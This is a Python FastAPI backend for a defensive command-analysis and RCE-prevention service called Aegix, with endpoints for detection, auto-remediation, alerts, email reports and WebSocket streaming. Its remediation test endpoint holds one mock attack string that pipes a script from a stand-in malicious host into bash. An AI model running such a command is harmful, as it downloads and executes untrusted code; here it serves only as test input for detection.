"""
Main FastAPI application for Aegix backend.
Handles command analysis via API and WebSocket event streaming.
"""

import os
import sys
import logging
import json

# Ensure project root is on sys.path so running `python app.py` from
# the `backend/` folder can still import the `backend` package.
PROJECT_ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
if PROJECT_ROOT not in sys.path:
    sys.path.insert(0, PROJECT_ROOT)

from fastapi import (
    FastAPI,
    WebSocket,
    WebSocketDisconnect,
    HTTPException,
    Query,
    Request,
)
from fastapi.middleware.cors import CORSMiddleware
from fastapi.staticfiles import StaticFiles
from slowapi import Limiter, _rate_limit_exceeded_handler
from slowapi.util import get_remote_address
from slowapi.errors import RateLimitExceeded
from pydantic import BaseModel
from typing import Dict, List, Optional
import asyncio
import uuid
import psutil
from datetime import datetime

from backend.config import get_settings
from backend.auth.session_tokens import create_session_token, verify_session_token
from backend.detection.pipeline import get_detection_pipeline
from backend.events.event_store import get_event_store
from backend.events.models import ExecveEvent, SecurityEvent
from backend.kernel.execve_hook import get_hook_manager
from backend.alerts.alert_manager import get_alert_manager
from backend.alerts.models import WebhookCreate, WebhookResponse, AlertHistoryResponse
from backend.agent.remediation import (
    kill_process,
    is_remediation_enabled,
    set_remediation_enabled,
)
from backend.detection.groq_explainer import (
    generate_llm_explanation,
    get_cached_llm_explanation,
)
from backend.detection.groq_chat import gemini_chat
from backend.notifications.notification_store import get_notification_store
from backend.notifications.models import (
    NotificationResponse,
    ActivityNotificationRequest,
    EmailReportRequest,
    EmailReportResponse,
    DepartmentEmailsResponse,
    DepartmentCreateRequest,
)
from backend.notifications.email_service import (
    send_gmail_report,
    build_report_summary,
    get_department_map,
    build_csv_attachment,
    build_html_email_summary,
)


def _resolve_session_id(session_token: str | None) -> str | None:
    if session_token and isinstance(session_token, str):
        session_id = verify_session_token(session_token)
        if session_id is None:
            raise HTTPException(status_code=400, detail="Invalid session_token")
        return session_id
    return None


def _notify(
    category: str,
    title: str,
    message: str,
    session_id: str | None = None,
) -> None:
    try:
        get_notification_store().add(
            category=category,
            title=title,
            message=message,
            session_id=session_id,
        )
    except Exception:
        logger.exception("Failed to record notification")


# ==============================================================================
# Models
# ==============================================================================


class CommandAnalysisRequest(BaseModel):
    """Request to analyze a command."""

    command: str


class AgentEventRequest(BaseModel):
    """Event forwarded by the always-on agent."""

    agent_id: str | None = None
    command: str
    pid: int = 0
    ppid: int = 0
    uid: int = 0
    gid: int = 0
    argv_str: str | None = None
    comm: str = "agent"
    timestamp: float | None = None
    process_memory_mb: float = 0.0
    system_memory_percent: float = 0.0


class CommandAnalysisResponse(BaseModel):
    """Response from command analysis."""

    command: str
    classification: str
    risk_score: float
    matched_rules: List[str]
    ml_confidence: float
    explanation: str


class LlmExplainRequest(BaseModel):
    """Request body for on-demand Groq Tier C explanation."""

    command: str
    classification: str
    risk_score: float
    matched_rules: List[str] = []
    ml_confidence: float = 0.0
    pid: Optional[int] = None
    ppid: Optional[int] = None
    uid: Optional[int] = None
    baseline_explanation: Optional[str] = None


class LlmExplainResponse(BaseModel):
    """Groq-generated detailed explanation."""

    llm_explanation: str
    source: str = "groq"


class ChatMessage(BaseModel):
    """A single message in the chatbot conversation."""

    role: str  # "user" or "assistant"
    content: str


class ChatRequest(BaseModel):
    """Request body for the Gemini chatbot endpoint."""

    messages: List[ChatMessage]


class ChatResponse(BaseModel):
    """Response from the Gemini chatbot."""

    reply: str
    cached: bool = False


# ==============================================================================
# FastAPI App Setup
# ==============================================================================

# ==============================================================================
# FastAPI App Setup
# ==============================================================================

settings = get_settings()
logger = logging.getLogger(__name__)

app = FastAPI(
    title="Aegix Security",
    description="Real-time RCE Prevention System",
    version="0.1.0",
)

# Rate Limiter setup
limiter = Limiter(
    key_func=get_remote_address,
    enabled=os.getenv("DISABLE_RATE_LIMITER", "false").lower() != "true"
)
app.state.limiter = limiter
app.add_exception_handler(RateLimitExceeded, _rate_limit_exceeded_handler)

# CORS middleware for frontend (restrict origins via config)
app.add_middleware(
    CORSMiddleware,
    allow_origins=settings.parsed_frontend_origins,
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)

# ==============================================================================
# Global State
# ==============================================================================

pipeline = get_detection_pipeline()
event_store = get_event_store(max_events=settings.event_cache_size)
hook_manager = get_hook_manager()
alert_manager = get_alert_manager()
notification_store = get_notification_store()
active_websockets: Dict[WebSocket, dict] = {}
active_websockets_lock = asyncio.Lock()
main_event_loop = None


def _build_execve_event(
    command: str,
    *,
    agent_id: str | None = None,
    pid: int = 0,
    ppid: int = 0,
    uid: int = 0,
    gid: int = 0,
    argv_str: str | None = None,
    comm: str = "api",
    timestamp: float | None = None,
    process_memory_mb: float = 0.0,
    system_memory_percent: float = 0.0,
    session_id: str | None = None,
) -> ExecveEvent:
    """Build a normalized execve event for both API and agent inputs."""
    return ExecveEvent(
        agent_id=agent_id,
        pid=pid,
        ppid=ppid,
        uid=uid,
        gid=gid,
        command=command,
        argv_str=argv_str or command,
        timestamp=timestamp or datetime.now().timestamp(),
        comm=comm,
        process_memory_mb=process_memory_mb,
        system_memory_percent=system_memory_percent,
        session_id=session_id,
    )


def _build_response(security_event: SecurityEvent) -> CommandAnalysisResponse:
    """Convert a security event into the API response model."""
    result = security_event.detection_result
    return CommandAnalysisResponse(
        command=security_event.execve_event.command,
        classification=result.classification,
        risk_score=result.risk_score,
        matched_rules=result.matched_rules,
        ml_confidence=result.ml_confidence,
        explanation=result.explanation or "",
    )


async def ingest_security_event(
    execve_event: ExecveEvent,
    *,
    source: str = "api",
    session_id: str | None = None,
) -> SecurityEvent:
    """Run detection, store the event, and broadcast it to the dashboard."""
    # Attach session_id to the execve_event (if provided)
    if session_id is not None:
        execve_event.session_id = session_id

    detection_result = pipeline.detect(
        execve_event.command,
        process_memory_mb=execve_event.process_memory_mb,
        system_memory_percent=execve_event.system_memory_percent,
    )
    security_event = SecurityEvent(
        id=f"evt_{uuid.uuid4().hex[:8]}",
        execve_event=execve_event,
        detection_result=detection_result,
        detected_at=datetime.now().timestamp(),
    )

    # Auto-Remediation: kill the process if malicious and toggle is ON
    if detection_result.classification == "malicious":
        if is_remediation_enabled():
            rem_result = kill_process(execve_event.pid)
            security_event.remediation_action = rem_result["action"]
            security_event.remediation_status = rem_result["status"]
        else:
            logger.warning(
                f"Malicious event detected (PID {execve_event.pid}) but Auto-Remediation is DISABLED. Skipping kill."
            )

    # Append to the configured event store. Session-aware stores will
    # use `security_event.execve_event.session_id` to keep events isolated.
    event_store.append(security_event)
    asyncio.create_task(alert_manager.dispatch(security_event))

    emoji = (
        "🟢"
        if security_event.detection_result.classification == "safe"
        else "🟡"
        if security_event.detection_result.classification == "suspicious"
        else "🔴"
    )
    rem_info = (
        f" | remediation={security_event.remediation_status}"
        if security_event.remediation_status
        else ""
    )
    logger.info(
        f"{emoji} {source.upper()} event: {execve_event.command[:50]} "
        f"(PID {execve_event.pid}) -> {security_event.detection_result.classification.upper()}{rem_info}"
    )

    await broadcast_event(security_event)
    return security_event


# ==============================================================================
# Startup & Shutdown
# ==============================================================================


@app.on_event("startup")
async def startup_event():
    """Initialize backend systems on startup."""
    global main_event_loop

    main_event_loop = asyncio.get_running_loop()

    # Define kernel event callback
    def on_kernel_event(execve_event):
        """Handle kernel events from eBPF."""
        try:
            # Capture memory footprint immediately
            try:
                proc = psutil.Process(execve_event.pid)
                execve_event.process_memory_mb = proc.memory_info().rss / (1024 * 1024)
            except (psutil.NoSuchProcess, psutil.AccessDenied):
                execve_event.process_memory_mb = 0.0

            execve_event.system_memory_percent = psutil.virtual_memory().percent

            # Run detection pipeline
            if main_event_loop:
                asyncio.run_coroutine_threadsafe(
                    ingest_security_event(execve_event, source="kernel"),
                    main_event_loop,
                )
        except Exception as e:
            logger.exception("Kernel event processing error")

    # Kernel monitor ownership policy
    owner = settings.validate_owner()
    kernel_active = False

    logger.info("==================================================")
    logger.info("Starting Aegix backend")
    logger.info(f"Platform: {sys.platform}")
    logger.info(f"Owner Mode: {owner}")
    logger.info(f"API URL: http://{settings.api_host}:{settings.api_port}")
    logger.info(f"WebSocket URL: ws://{settings.api_host}:{settings.api_port}/ws")

    if owner == "backend":
        # Start kernel monitoring with callback
        try:
            hook_manager.start(event_callback=on_kernel_event)
            kernel_active = getattr(hook_manager.monitor, "running", False)
            logger.info("Aegix security module initialized (owned by backend)")
            store_type = (
                type(event_store).__name__ if event_store is not None else "<none>"
            )
            logger.info(
                f"Startup: DB path={settings.db_path} | EventStore={store_type}"
            )
        except Exception as e:
            logger.exception(
                "Aegix security module initialization failed; operating in API-only mode"
            )
    elif owner == "agent":
        logger.info(
            "Kernel monitor ownership set to 'agent' — backend will not attach eBPF hooks"
        )
    else:
        logger.info(
            "Kernel monitoring disabled by configuration (KERNEL_MONITOR_OWNER=disabled)"
        )

    logger.info(f"Kernel Active: {'YES' if kernel_active else 'NO'}")
    logger.info("Backend ready")


@app.on_event("shutdown")
async def shutdown_event():
    """Cleanup on shutdown."""
    logger.info("Shutting down...")
    hook_manager.stop()
    logger.info("Shutdown complete")


# ==============================================================================
# API Endpoints
# ==============================================================================


@app.get("/healthz")
async def healthz():
    """Fast health ping."""
    return {"status": "ok"}


@app.get("/readyz")
async def readyz():
    """Readiness probe for deploy environments."""
    try:
        # Validate core dependencies are initialized and DB is reachable.
        _ = pipeline is not None
        _ = alert_manager is not None
        _ = event_store.size()
        return {"status": "ready"}
    except Exception as e:
        raise HTTPException(status_code=503, detail=f"Not ready: {e}")


@app.post("/analyze", response_model=CommandAnalysisResponse)
@limiter.limit("30/minute")
async def analyze_command(
    request: Request,
    body: CommandAnalysisRequest,
    session_token: str | None = Query(default=None),
):
    """
    Analyze a command for threat level.

    Args:
        request: CommandAnalysisRequest with command string

    Returns:
        CommandAnalysisResponse with detection results
    """
    if not body.command or not body.command.strip():
        raise HTTPException(status_code=400, detail="Command cannot be empty")

    session_id = _resolve_session_id(session_token)

    execve_event = _build_execve_event(body.command, session_id=session_id)
    security_event = await ingest_security_event(
        execve_event, source="api", session_id=session_id
    )
    return _build_response(security_event)


async def _generate_and_attach_llm(
    *,
    command: str,
    classification: str,
    risk_score: float,
    matched_rules: List[str],
    ml_confidence: float,
    pid: Optional[int] = None,
    ppid: Optional[int] = None,
    uid: Optional[int] = None,
    baseline_explanation: Optional[str] = None,
    event_id: Optional[str] = None,
    force: bool = False,
) -> LlmExplainResponse:
    if event_id and not force:
        cached = get_cached_llm_explanation(event_id)
        if cached:
            return LlmExplainResponse(llm_explanation=cached, cached=True)

    try:
        llm_text = await generate_llm_explanation(
            command,
            classification=classification,
            risk_score=risk_score,
            matched_rules=matched_rules,
            ml_confidence=ml_confidence,
            pid=pid,
            ppid=ppid,
            uid=uid,
            baseline_explanation=baseline_explanation,
            event_id=event_id,
            force=force,
        )
    except ValueError as exc:
        raise HTTPException(status_code=503, detail=str(exc)) from exc
    except RuntimeError as exc:
        raise HTTPException(status_code=502, detail=str(exc)) from exc
    except Exception as exc:
        logger.exception("Groq explanation failed")
        raise HTTPException(
            status_code=502, detail="Failed to generate LLM explanation"
        ) from exc

    if event_id:
        event = event_store.get_event(event_id)
        if event:
            event.detection_result.llm_explanation = llm_text

    return LlmExplainResponse(llm_explanation=llm_text, cached=False)


@app.post("/chat", response_model=ChatResponse)
@app.post("/api/chat", response_model=ChatResponse)
@limiter.limit("30/minute")
async def chat_endpoint(
    request: Request,
    body: ChatRequest,
) -> ChatResponse:
    """
    Gemini-powered cybersecurity chatbot.
    Strictly limited to cybersecurity and shell command topics.
    """
    if not body.messages:
        raise HTTPException(status_code=400, detail="No messages provided.")

    messages = [{"role": m.role, "content": m.content} for m in body.messages]

    try:
        reply = await gemini_chat(messages)
    except RuntimeError as exc:
        raise HTTPException(status_code=503, detail=str(exc)) from exc
    except Exception as exc:
        logger.exception("Gemini chat failed")
        raise HTTPException(status_code=502, detail="Chat service error.") from exc

    return ChatResponse(reply=reply)


@app.post("/analyze/llm-explain", response_model=LlmExplainResponse)
@limiter.limit("10/minute")
async def analyze_llm_explain(
    request: Request,
    body: LlmExplainRequest,
    session_token: str | None = Query(default=None),
):
    """Generate a detailed Groq Tier C explanation for a command (sandbox / manual)."""
    _resolve_session_id(session_token)

    if not body.command or not body.command.strip():
        raise HTTPException(status_code=400, detail="Command cannot be empty")

    return await _generate_and_attach_llm(
        command=body.command.strip(),
        classification=body.classification,
        risk_score=body.risk_score,
        matched_rules=body.matched_rules,
        ml_confidence=body.ml_confidence,
        pid=body.pid,
        ppid=body.ppid,
        uid=body.uid,
        baseline_explanation=body.baseline_explanation,
    )


@app.post("/agent/events", response_model=CommandAnalysisResponse)
@app.post("/api/agent/events", response_model=CommandAnalysisResponse)
@limiter.limit("60/minute")
async def ingest_agent_event(
    request: Request,
    event: AgentEventRequest,
    session_token: str | None = Query(default=None),
):
    """Ingest an event forwarded by the always-on agent."""
    if not event.command or not event.command.strip():
        raise HTTPException(status_code=400, detail="Command cannot be empty")

    session_id = _resolve_session_id(session_token)

    execve_event = _build_execve_event(
        event.command,
        agent_id=event.agent_id,
        pid=event.pid,
        ppid=event.ppid,
        uid=event.uid,
        gid=event.gid,
        argv_str=event.argv_str,
        comm=event.comm,
        timestamp=event.timestamp,
        process_memory_mb=event.process_memory_mb,
        system_memory_percent=event.system_memory_percent,
        session_id=session_id,
    )
    security_event = await ingest_security_event(
        execve_event, source="agent", session_id=session_id
    )
    return _build_response(security_event)


@app.get("/events")
@limiter.limit("20/minute")
async def get_events(
    request: Request,
    limit: int = Query(default=100, ge=1, le=1000),
    agent_id: str | None = Query(default=None),
    session_token: str | None = Query(default=None),
):
    """
    Get recent security events.

    Args:
        limit: Maximum number of events to return

    Returns:
        List of recent SecurityEvent objects as dicts
    """
    session_id = _resolve_session_id(session_token)

    events = event_store.get_recent(limit, agent_id=agent_id, session_id=session_id)
    return [e.dict() for e in events]


@app.post("/events/{event_id}/llm-explain", response_model=LlmExplainResponse)
@limiter.limit("10/minute")
async def explain_event_llm(
    request: Request,
    event_id: str,
    session_token: str | None = Query(default=None),
    force: bool = Query(default=False),
):
    """Generate a detailed Groq Tier C explanation for a stored security event."""
    session_id = _resolve_session_id(session_token)

    event = event_store.get_event(event_id, session_id=session_id)
    if not event:
        event = event_store.get_event(event_id, session_id=None)
        if not event:
            raise HTTPException(status_code=404, detail="Event not found")

    event_session = getattr(event.execve_event, "session_id", None)
    if session_id and event_session and event_session != session_id:
        raise HTTPException(status_code=403, detail="Forbidden")

    if not force and event.detection_result.llm_explanation:
        return LlmExplainResponse(
            llm_explanation=event.detection_result.llm_explanation,
            cached=True,
        )

    if not force:
        cached = get_cached_llm_explanation(event_id)
        if cached:
            event.detection_result.llm_explanation = cached
            return LlmExplainResponse(llm_explanation=cached, cached=True)

    result = event.detection_result
    execve = event.execve_event
    response = await _generate_and_attach_llm(
        command=execve.command,
        classification=result.classification,
        risk_score=result.risk_score,
        matched_rules=result.matched_rules,
        ml_confidence=result.ml_confidence,
        pid=execve.pid,
        ppid=execve.ppid,
        uid=execve.uid,
        baseline_explanation=result.explanation,
        event_id=event_id,
        force=force,
    )
    event.detection_result.llm_explanation = response.llm_explanation
    return response


@app.get("/events/{event_id}/explain")
@limiter.limit("10/minute")
async def explain_event(
    request: Request, event_id: str, session_token: str | None = Query(default=None)
):
    """
    Get the Tier A/B rule-based explanation for a specific event.
    """
    session_id = _resolve_session_id(session_token)

    # Try fetching with the exact session_id first
    event = event_store.get_event(event_id, session_id=session_id)
    if not event:
        # Fallback: maybe it's a system-wide event (session_id=None in DB)
        event = event_store.get_event(event_id, session_id=None)
        if not event:
            import logging

            logging.getLogger(__name__).error(
                f"Event {event_id} not found! cache_keys={list(event_store._cache.keys())[-5:]}"
            )
            raise HTTPException(status_code=404, detail="Event not found")

    event_session = getattr(event.execve_event, "session_id", None)
    if session_id and event_session and event_session != session_id:
        raise HTTPException(status_code=403, detail="Forbidden")

    explanation = event.detection_result.explanation
    if not explanation:
        explanation = pipeline._build_explanation(
            event.detection_result.classification,
            event.detection_result.risk_score,
            event.detection_result.matched_rules,
            event.detection_result.ml_confidence,
        )
        event_store.update_event_explanation(
            event_id,
            explanation,
            session_id=event_session,
        )

    return {"explanation": explanation}


@app.delete("/events")
async def clear_events(session_token: str | None = Query(default=None)):
    """Delete all stored security events and clear the in-memory cache.

    If `SESSION_MODE` is active, `session_token` is required and only that session will be cleared.
    Otherwise a global clear is performed.
    """
    if settings.session_mode:
        if not session_token or not isinstance(session_token, str):
            raise HTTPException(
                status_code=400, detail="session_token required in SESSION_MODE"
            )
        session_id = _resolve_session_id(session_token)
        deleted = event_store.size(session_id)
        event_store.clear(session_id)
        _notify(
            "logs",
            "Logs moved to bin",
            f"{deleted} security event(s) permanently deleted from the store.",
            session_id=session_id,
        )
        return {"status": "ok", "deleted_events": deleted}
    else:
        deleted_events = event_store.size()
        event_store.clear()
        _notify(
            "logs",
            "Logs moved to bin",
            f"{deleted_events} security event(s) permanently deleted from the store.",
        )
        return {"status": "ok", "deleted_events": deleted_events}


@app.get("/stats")
async def get_stats(
    agent_id: str | None = Query(default=None),
    session_token: str | None = Query(default=None),
):
    """Get statistics about detected events."""
    session_id = _resolve_session_id(session_token)
    return {
        "total_events": event_store.size(session_id=session_id, agent_id=agent_id),
        "safe": event_store.count_by_classification(
            "safe", agent_id=agent_id, session_id=session_id
        ),
        "suspicious": event_store.count_by_classification(
            "suspicious", agent_id=agent_id, session_id=session_id
        ),
        "malicious": event_store.count_by_classification(
            "malicious", agent_id=agent_id, session_id=session_id
        ),
    }


@app.get("/webhooks", response_model=List[WebhookResponse])
async def list_webhooks():
    """List all registered webhooks."""
    return alert_manager.get_webhooks()


@app.get("/session")
async def create_session():
    """Create a new signed session token for demo sessions.

    Returns a JSON object: {"session_token": "..."}
    """
    import uuid as _uuid

    sid = _uuid.uuid4().hex
    token = create_session_token(sid)
    return {"session_token": token}


@app.post("/webhooks", response_model=WebhookResponse)
async def create_webhook(request: WebhookCreate):
    """Register a new webhook URL."""
    if not request.url.startswith("http"):
        raise HTTPException(status_code=400, detail="Invalid URL")
    wh = alert_manager.add_webhook(
        request.url,
        trigger_safe=request.trigger_safe,
        trigger_suspicious=request.trigger_suspicious,
        trigger_malicious=request.trigger_malicious,
    )
    triggers = []
    if request.trigger_safe:
        triggers.append("SAFE")
    if request.trigger_suspicious:
        triggers.append("SUSPICIOUS")
    if request.trigger_malicious:
        triggers.append("MALICIOUS")
    _notify(
        "webhook",
        "Webhook registered",
        f"New endpoint {request.url[:60]}… · triggers: {', '.join(triggers) or 'none'}",
    )
    return wh


@app.delete("/webhooks/{webhook_id}")
async def delete_webhook(webhook_id: str):
    """Remove a webhook."""
    webhooks = alert_manager.get_webhooks()
    target = next((w for w in webhooks if w.id == webhook_id), None)
    alert_manager.remove_webhook(webhook_id)
    if target:
        _notify(
            "webhook",
            "Webhook removed",
            f"Endpoint {target.url[:60]}… was deactivated and deleted.",
        )
    return {"status": "success"}


@app.get("/alerts/history", response_model=List[AlertHistoryResponse])
async def list_alert_history(limit: int = Query(default=50, ge=1, le=1000)):
    """Get history of triggered alerts."""
    return alert_manager.get_alert_history(limit)


# ==============================================================================
# Remediation Settings
# ==============================================================================


@app.get("/settings/remediation")
async def get_remediation_settings():
    """Get current auto-remediation toggle state."""
    return {"enabled": is_remediation_enabled()}


@app.post("/settings/remediation")
async def update_remediation_settings(body: dict):
    """Enable or disable auto-remediation."""
    enabled = body.get("enabled", False)
    set_remediation_enabled(bool(enabled))
    return {"enabled": is_remediation_enabled()}


@app.post("/settings/remediation/test")
async def run_remediation_test(
    request: Request,
    session_token: str | None = Query(default=None),
):
    """
    Simulates a remediation attack by spawning a dummy process and
    analyzing a malicious command associated with it.
    """
    # 1. Spawn a dummy process that sleeps
    import subprocess
    import sys
    try:
        proc = subprocess.Popen(
            [sys.executable, "-c", "import time; time.sleep(15)"],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
        )
        pid = proc.pid
    except Exception as e:
        raise HTTPException(status_code=500, detail=f"Failed to spawn dummy process: {e}")

    # 2. Resolve session ID
    session_id = _resolve_session_id(session_token)

    # 3. Construct and ingest a simulated malicious command with that PID
    mock_command = "curl -s http://evil-malicious-domain.com/shell.sh | bash"
    execve_event = _build_execve_event(
        command=mock_command,
        pid=pid,
        comm="python",
        session_id=session_id,
    )

    # Run through the pipeline
    sec_event = await ingest_security_event(
        execve_event, source="remediation-test", session_id=session_id
    )

    # Give a brief moment for termination check
    await asyncio.sleep(0.5)

    # Check if the process is dead
    poll = proc.poll()
    is_dead = poll is not None

    # Clean up if still running
    if not is_dead:
        try:
            proc.kill()
        except:
            pass

    return {
        "pid": pid,
        "command": mock_command,
        "classification": sec_event.detection_result.classification,
        "risk_score": sec_event.detection_result.risk_score,
        "remediation_status": sec_event.remediation_status,
        "remediation_action": sec_event.remediation_action,
        "is_dead": is_dead,
        "remediation_enabled": is_remediation_enabled(),
    }


@app.get("/settings/thresholds")
async def get_threshold_settings():
    """Get current classification thresholds."""
    return {
        "suspicious_threshold": pipeline.suspicious_threshold,
        "malicious_threshold": pipeline.malicious_threshold,
    }


@app.post("/settings/thresholds")
async def update_threshold_settings(body: dict):
    """Update classification thresholds."""
    suspicious = float(body.get("suspicious_threshold", 30.0))
    malicious = float(body.get("malicious_threshold", 70.0))
    old_mal = pipeline.malicious_threshold
    pipeline.update_thresholds(suspicious, malicious)
    sensitivity_pct = round(100 - malicious, 1)
    _notify(
        "settings",
        "AI sensitivity changed",
        f"Malicious threshold {old_mal:.0f} → {malicious:.0f} "
        f"(aggressiveness ~{sensitivity_pct}%).",
    )
    return {
        "suspicious_threshold": pipeline.suspicious_threshold,
        "malicious_threshold": pipeline.malicious_threshold,
    }


# ==============================================================================
# Notifications & Email Reports
# ==============================================================================


@app.get("/notifications", response_model=List[NotificationResponse])
@app.get("/api/notifications", response_model=List[NotificationResponse])
async def list_notifications(
    limit: int = Query(default=50, ge=1, le=200),
    session_token: str | None = Query(default=None),
    unread_only: bool = Query(default=False),
):
    session_id = _resolve_session_id(session_token)
    return notification_store.list_recent(
        limit=limit, session_id=session_id, unread_only=unread_only
    )


@app.get("/notifications/unread-count")
@app.get("/api/notifications/unread-count")
async def notifications_unread_count(session_token: str | None = Query(default=None)):
    session_id = _resolve_session_id(session_token)
    return {"count": notification_store.unread_count(session_id=session_id)}


@app.post("/notifications/{notif_id}/read")
@app.post("/api/notifications/{notif_id}/read")
async def mark_notification_read(notif_id: str):
    if not notification_store.mark_read(notif_id):
        raise HTTPException(status_code=404, detail="Notification not found")
    return {"status": "ok"}


@app.post("/notifications/read-all")
@app.post("/api/notifications/read-all")
async def mark_all_notifications_read(session_token: str | None = Query(default=None)):
    session_id = _resolve_session_id(session_token)
    updated = notification_store.mark_all_read(session_id=session_id)
    return {"status": "ok", "marked_read": updated}


@app.delete("/notifications")
@app.delete("/api/notifications")
async def clear_notifications(session_token: str | None = Query(default=None)):
    session_id = _resolve_session_id(session_token)
    deleted = notification_store.clear_all(session_id=session_id)
    return {"status": "ok", "deleted": deleted}


@app.post("/notifications/activity", response_model=NotificationResponse)
@app.post("/api/notifications/activity", response_model=NotificationResponse)
async def record_activity_notification(
    body: ActivityNotificationRequest,
    session_token: str | None = Query(default=None),
):
    session_id = _resolve_session_id(session_token)
    mapping = {
        "logs_exported": ("logs", "Logs exported", body.detail or "Event log downloaded as JSON."),
        "logs_binned": ("logs", "Logs moved to bin", body.detail or "Events cleared from store."),
    }
    if body.type not in mapping:
        raise HTTPException(status_code=400, detail=f"Unknown activity type: {body.type}")
    cat, title, msg = mapping[body.type]
    return notification_store.add(
        category=cat, title=title, message=msg, session_id=session_id
    )


@app.get("/reports/departments", response_model=DepartmentEmailsResponse)
@app.get("/api/reports/departments", response_model=DepartmentEmailsResponse)
async def list_department_emails():
    return DepartmentEmailsResponse(departments=get_department_map())


@app.post("/reports/departments")
@app.post("/api/reports/departments")
async def add_department_endpoint(body: DepartmentCreateRequest):
    name = body.name.strip()
    email = body.email.strip()
    if not name or not email:
        raise HTTPException(status_code=400, detail="Name and email cannot be empty")
    if "@" not in email or "." not in email.split("@")[-1]:
        raise HTTPException(status_code=400, detail="Invalid email address")
    get_notification_store().add_department(name, email)
    return {"status": "ok"}


@app.delete("/reports/departments/{name}")
@app.delete("/api/reports/departments/{name}")
async def delete_department_endpoint(name: str):
    name = name.strip()
    if not name:
        raise HTTPException(status_code=400, detail="Name cannot be empty")
    if not get_notification_store().delete_department(name):
        raise HTTPException(status_code=404, detail="Department not found")
    return {"status": "ok"}


@app.post("/reports/email", response_model=EmailReportResponse)
@app.post("/api/reports/email", response_model=EmailReportResponse)
@limiter.limit("10/hour")
async def send_email_report(request: Request, body: EmailReportRequest):
    if "@" not in body.to_email or "." not in body.to_email.split("@")[-1]:
        raise HTTPException(status_code=400, detail="Invalid email address")

    session_id = None
    if body.session_token:
        session_id = _resolve_session_id(body.session_token)

    events = event_store.get_recent(1000, session_id=session_id)
    event_dicts = [e.dict() for e in events]
    stats = {
        "total_events": event_store.size(session_id=session_id),
        "safe": event_store.count_by_classification("safe", session_id=session_id),
        "suspicious": event_store.count_by_classification(
            "suspicious", session_id=session_id
        ),
        "malicious": event_store.count_by_classification(
            "malicious", session_id=session_id
        ),
    }

    summary = build_report_summary(stats, event_dicts)
    recipients = [body.to_email.strip()]
    cc: list[str] = []

    if body.department:
        dept_map = get_department_map()
        dept_email = dept_map.get(body.department)
        if dept_email:
            cc.append(dept_email)

    provider = (body.provider or "gmail").lower()
    if provider != "gmail":
        raise HTTPException(status_code=400, detail="Only Gmail SMTP is supported currently")

    # Handle multi-format attachment & html email
    body_html = None
    attachment_content = None
    attachment_filename = None
    report_format = (body.format or "json").lower()

    if report_format == "csv":
        csv_data = build_csv_attachment(event_dicts)
        attachment_content = csv_data.encode("utf-8")
        attachment_filename = f"aegix_events_{datetime.now().strftime('%Y%m%d_%H%M%S')}.csv"
    elif report_format == "html":
        body_html = build_html_email_summary(stats, event_dicts)
    else:  # json
        json_data = {
            "generated_at": datetime.now().isoformat(),
            "stats": stats,
            "events": event_dicts,
        }
        attachment_content = json.dumps(json_data, indent=2, default=str).encode("utf-8")
        attachment_filename = f"aegix_events_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"

    try:
        send_gmail_report(
            to_emails=recipients,
            cc_emails=cc or None,
            subject=f"AEGIX Security — Session Log Report ({report_format.upper()})",
            body_text=summary,
            body_html=body_html,
            attachment_content=attachment_content,
            attachment_filename=attachment_filename,
        )
        _notify(
            "email",
            "Report email sent",
            f"Log report ({report_format.upper()}) emailed to {body.to_email}"
            + (f" (CC: {body.department})" if body.department else ""),
            session_id=session_id,
        )
        return EmailReportResponse(
            status="success",
            message=f"Report sent successfully in {report_format.upper()} format.",
            recipients=recipients + cc,
        )
    except ValueError as exc:
        _notify(
            "email",
            "Email delivery failed",
            str(exc),
            session_id=session_id,
        )
        raise HTTPException(status_code=503, detail=str(exc)) from exc
    except Exception as exc:
        logger.exception("Email send failed")
        _notify(
            "email",
            "Email delivery failed",
            str(exc)[:200],
            session_id=session_id,
        )
        raise HTTPException(status_code=502, detail="Failed to send email report") from exc


# ==============================================================================
# WebSocket
# ==============================================================================


@app.websocket("/ws")
async def websocket_endpoint(
    websocket: WebSocket,
    agent_id: str | None = Query(default=None),
    session_token: str | None = Query(default=None),
):
    """
    WebSocket endpoint for real-time event streaming.
    Broadcasts security events to connected clients filtered by agent_id when provided.
    """
    await websocket.accept()
    # Validate session token if supplied
    session_id = None
    if session_token and isinstance(session_token, str):
        session_id = verify_session_token(session_token)
        if session_id is None:
            await websocket.close(code=4001)
            return

    async with active_websockets_lock:
        active_websockets[websocket] = {"agent_id": agent_id, "session_id": session_id}
        active_count = len(active_websockets)

    try:
        logger.info(f"WebSocket client connected ({active_count} active)")

        # Send recent events to new client
        recent_events = event_store.get_recent(
            100, agent_id=agent_id, session_id=session_id
        )
        for event in recent_events:
            try:
                await websocket.send_json(event.dict())
            except Exception:
                logger.exception("Failed to send recent event to new websocket client")

        # Keep connection alive
        while True:
            # Client can send ping to stay alive
            data = await websocket.receive_text()
            if data == "ping":
                await websocket.send_text("pong")

    except WebSocketDisconnect:
        # Normal browser refresh/navigation closes the socket with code 1001.
        pass

    except Exception:
        logger.exception("WebSocket error")

    finally:
        async with active_websockets_lock:
            active_websockets.pop(websocket, None)
            active_count = len(active_websockets)
        logger.info(f"WebSocket client disconnected ({active_count} active)")


async def broadcast_event(event: SecurityEvent):
    """
    Broadcast a security event to all connected WebSocket clients.

    Args:
        event: SecurityEvent to broadcast
    """
    dead_connections = set()

    # Snapshot avoids set-size-change errors during iteration.
    async with active_websockets_lock:
        websockets_snapshot = list(active_websockets.items())

    for websocket, meta in websockets_snapshot:
        websocket_agent_id = meta.get("agent_id") if isinstance(meta, dict) else None
        websocket_session_id = (
            meta.get("session_id") if isinstance(meta, dict) else None
        )

        # If the client subscribed to a session, only send events matching that session
        if websocket_session_id is not None:
            if event.execve_event.session_id != websocket_session_id:
                continue
        elif websocket_agent_id is not None:
            # If client subscribed to an agent, require agent match
            if event.execve_event.agent_id != websocket_agent_id:
                continue
        else:
            # Global subscriber: do not leak session-scoped events
            if getattr(event.execve_event, "session_id", None) is not None:
                continue
        try:
            await websocket.send_json(event.dict())
        except Exception:
            logger.exception("Failed to send event to client")
            dead_connections.add(websocket)

    # Cleanup dead connections
    if dead_connections:
        async with active_websockets_lock:
            for ws in dead_connections:
                active_websockets.pop(ws, None)


# ==============================================================================
# Event Processing Callback
# ==============================================================================


async def process_execve_event(execve_event: ExecveEvent):
    """
    Process an execve event from the kernel.

    Args:
        execve_event: ExecveEvent object with kernel data
    """
